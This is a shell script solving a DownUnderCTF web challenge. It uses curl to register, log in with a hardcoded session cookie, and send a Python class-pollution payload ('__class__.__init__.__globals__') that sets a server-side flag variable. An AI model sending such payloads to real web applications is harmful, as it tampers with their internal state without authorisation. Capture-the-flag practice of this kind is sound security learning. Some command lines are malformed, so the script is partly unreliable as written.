#!/bin/sh

url_host='https://web-co2-7c7e6b567a43f5e7.2024.ductf.dev'
session='.eJwlzj0OwjAMQOG7ZGZw_BO7vUzlxI5gTemEuDuV2N7bvk855srzWfb3uvJRjleUvWwN1GJ05qqgmelIph7MkTEhOiVIVZuSOgNAMo0zGzs1MnYWwEaTCWKQ3t8qu8WsKuZmqLIpU4NNeroL3IXYawwbiehYbsh15vpravn-AKGKLno.ZqcKSg.vz13ORJ2e6wl4XIhNYCjM0lBXmo'
#REGISTRARSE
curl --location --request GET "$url_host/register" \
--header 'Content-Type: application/json' \
--data '{
    "username": "a",
    "password": "a"
}'

#LOGIN #Luego hace un redirect y setea la cookie, que la obtenemos del navegador
curl --location --request GET "$url_host/login" \
--header 'Content-Type: application/json' \
--data '{
    "username": "a",
    "password": "a"
}' |

curl --location "$url_host" + '/save_feedback' \
--header "Cookie: session=$session" \
--header 'Content-Type: application/json' \
--data '{
    "title": "test",
    "content": "test",
    "rating": "123",
    "referred": "test",
    "__class__": {
        "__init__": {
            "__globals__": {
                "flag": "true"
            }
        }
    }
}'

curl --location --request GET "$url_host/get_flag" \
--header "Cookie: session=$session" \
--header 'Content-Type: application/json' \
--data '{
    "title": "test",
    "content": "test",
    "rating": "123",
    "referred": "test",
    "__class__": {
        "__init__": {
            "__globals__": {
                "flag": "true"
            }
        }
    }
}' > flag.txt
